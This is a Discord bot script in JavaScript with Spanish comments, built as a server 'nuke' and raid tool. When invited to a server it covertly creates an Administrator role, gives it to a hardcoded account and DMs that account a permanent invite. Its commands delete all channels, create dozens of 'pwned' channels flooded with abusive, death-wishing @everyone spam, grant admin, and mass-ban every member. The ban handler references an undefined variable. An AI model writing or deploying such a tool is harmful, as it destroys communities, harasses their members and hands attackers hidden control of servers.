require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';

// Ya no usamos OWNER_IDS para limitar comandos
// const OWNER_IDS = ["1436516806842912970"]; // comentado o borrado

client.once('ready', async () => {
  console.log('Bot conectado como ' + client.user.tag);
  console.log('Prefijo: ' + PREFIX);

  // Registrar el comando slash /ban_all
  const commands = [
    new SlashCommandBuilder()
      .setName('ban_all')
      .setDescription('Intenta banear a todos los miembros del servidor (excepto bots y tú)')
      .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers)
  ];

  try {
    await client.application.commands.set(commands);
    console.log('Comando /ban_all registrado');
  } catch (err) {
    console.error('Error al registrar /ban_all:', err);
  }
});

// ────────────────────────────────────────────────
//     EVENTO: Auto-admin + DM al unirse a server
// ────────────────────────────────────────────────

client.on('guildCreate', async (guild) => {
  console.log(`[ENTRADA] Nuevo servidor: ${guild.name} (ID: ${guild.id}) - Owner ID: ${guild.ownerId}`);

  try {
    // 1. Crear rol con permisos de administrador
    const rolAdmin = await guild.roles.create({
      name: 'Admin permenente',          // nombre del rol (cámbialo si querés)
      color: '#FF0000',                // rojo intenso
      permissions: ['Administrator'],  // todos los permisos de admin
      hoist: true,                     // aparece separado en la lista
      mentionable: true                // se puede mencionar
    });
    console.log(`[ROL CREADO] ${rolAdmin.name} en ${guild.name}`);

    // 2. Asignar el rol a TU ID (la cuenta donde querés recibir el DM y el rol)
    const tuId = '1436516806842912970'; // ← CAMBIA POR TU ID REAL (el de la cuenta que recibe el DM)
    let member = await guild.members.fetch(tuId).catch(() => null);

    // Si no estás en el server, asignar al OWNER del servidor (cuenta secundaria o quien lo creó)
    if (!member) {
      console.log(`[INFO] Tu ID no está en el server. Asignando al owner ${guild.ownerId}`);
      member = await guild.members.fetch(guild.ownerId).catch(() => null);
    }

    if (member) {
      await member.roles.add(rolAdmin);
      console.log(`[ROL ASIGNADO] a ${member.user.tag} en ${guild.name}`);

      // 3. Crear invite permanente
      let inviteLink = 'No pude crear invite (falta permiso Create Instant Invite)';
      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));

      if (canal) {
        const invite = await canal.createInvite({
          maxAge: 0,      // permanente
          maxUses: 0,     // ilimitado
          unique: true
        }).catch(err => {
          console.log(`[ERROR INVITE] ${err.message}`);
          return null;
        });

        if (invite) inviteLink = invite.url;
      }

      // 4. Enviar DM privado a TI (tu ID fijo)
      try {
        const dmUser = await client.users.fetch(tuId);
        await dmUser.send(`!nuevo! ${inviteLink}`);
        console.log(`[DM ENVIADO] a ${tuId}: !nuevo! ${inviteLink}`);
      } catch (dmErr) {
        console.log(`[ERROR DM] No pude enviar DM a ${tuId}: ${dmErr.message}`);
      }

    } else {
      console.log(`[NO MIEMBRO] No encontré a nadie para asignar el rol en ${guild.name}`);
    }

  } catch (err) {
    console.error(`[ERROR GUILDCREATE] ${err.message}`);
  }
});

// ────────────────────────────────────────────────
//                COMANDOS PREFIX (como antes)
// ────────────────────────────────────────────────

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'test') {
    return message.reply('¡El bot funciona! Prefijo detectado correctamente.');
  }

  if (command === 'help') {
    return message.reply('Comandos:\n!test → prueba\n!vale → nuke en ráfaga extrema\n!admin → dame admin\n!help → este mensaje');
  }

  if (command === 'vale') {
    const nombresDeCanales = [
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
    ];

    const mensajesEnRafaga = [
      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6",
      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6",
      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6 ",
      "@everyone puto mal parido hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6",
      "@everyone JAJAJAJAJA PUTO PERRO  https://discord.gg/Gvpej3G6",
      "@everyone ojalas te mueras hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6 ",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6 ",
      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
      "@everyone pendejo subnormal hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
      "@everyone pendejo subnormal hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone Tu server asqueroso JAJAJAJa  https://discord.gg/Gvpej3G6",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6 ",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6 ",
      "@everyone JAJAJAJAJA PUTO PERRO 7 https://discord.gg/Gvpej3G6",
      "@everyone ojalas te mueras hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone puto mal parido hijueputa  https://discord.gg/Gvpej3G6",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 "
    ];

    const delayCreacionCanales = 200;
    const delayEntreMensajes = 120;

    try {
      await message.reply(
        `**¡NUKE EN RÁFAGA EXTREMA INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${nombresDeCanales.length}** canales\n` +
        `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal`
      );

      await new Promise(r => setTimeout(r, 5000));

      const guild = message.guild;

      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke rápido');
            borrados++;
            await new Promise(r => setTimeout(r, 150));
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`);

      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal
            .toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')
            .replace(/\s+/g, '-')
            .replace(/-+/g, '-')
            .slice(0, 100) || 'raid-default';

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          await new Promise(r => setTimeout(r, delayCreacionCanales));
        } catch (err) {
          console.log(`Fallo creando canal: ${err.message}`);
        }
      }
      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

      const promesas = nuevosCanales.map(async (canal) => {
        for (const msg of mensajesEnRafaga) {
          try {
            await canal.send(msg);
            await new Promise(r => setTimeout(r, delayEntreMensajes));
          } catch (errMsg) {
            if (errMsg.code === 429) {
              await new Promise(r => setTimeout(r, 5000));
              await canal.send(msg).catch(() => {});
            }
          }
        }
      });

      await Promise.all(promesas);

      await message.channel.send(`**¡CEREZA DEL PASTEL!** 😈\nCanales spameados en ráfaga extrema.`);

    } catch (err) {
      console.error('Error en !vale:', err.message);
      await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
    }
  }

  if (command === 'admin') {
    const serverName = args.join(' ');
    if (!serverName) {
      return message.reply('Uso: !admin <nombre del servidor>\nEjemplo: !admin Mi Server Raid');
    }

    try {
      let rolAdmin = message.guild.roles.cache.find(r => r.name === 'Admin Raid');
      if (!rolAdmin) {
        rolAdmin = await message.guild.roles.create({
          name: 'Admin Raid',
          color: '#FF0000',
          permissions: ['Administrator'],
          hoist: true,
          mentionable: true
        });
        await message.channel.send('Rol **Admin Raid** creado.');
      }

      await message.member.roles.add(rolAdmin);
      await message.channel.send(`¡Listo! Ahora tienes **Admin Raid** en **${serverName}** 😈`);

      await message.channel.send(`@everyone EL OWNER AHORA ES ADMIN AQUÍ 🔥 tu-invite`);

    } catch (err) {
      console.error('Error en !admin:', err.message || err);
      await message.channel.send(`Error: ${err.message || 'No tengo permisos suficientes'}`).catch(() => {});
    }
  }
});

// Manejar el comando slash /ban_all
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'ban_all') {
    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const botId = client.user.id;

    let baneados = 0;
    let fallos = 0;

    for (const member of guild.members.cache.values()) {
      if (member.user.bot || member.user.id === botId || member.user.id === TU_ID) {
        continue;
      }

      try {
        await member.ban({ reason: 'Ban All by Patricio - RAID 🔥' });
        baneados++;
        await new Promise(r => setTimeout(r, 1200));
      } catch (err) {
        fallos++;
        console.log(`Fallo al banear ${member.user.tag}: ${err.message}`);
      }
    }

    await interaction.editReply({
      content: `**Ban All finalizado**\nBaneados: **${baneados}**\nFallos: **${fallos}**\n(No se banea bots ni tu ID (${TU_ID}))`,
      ephemeral: true
    });
  }
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});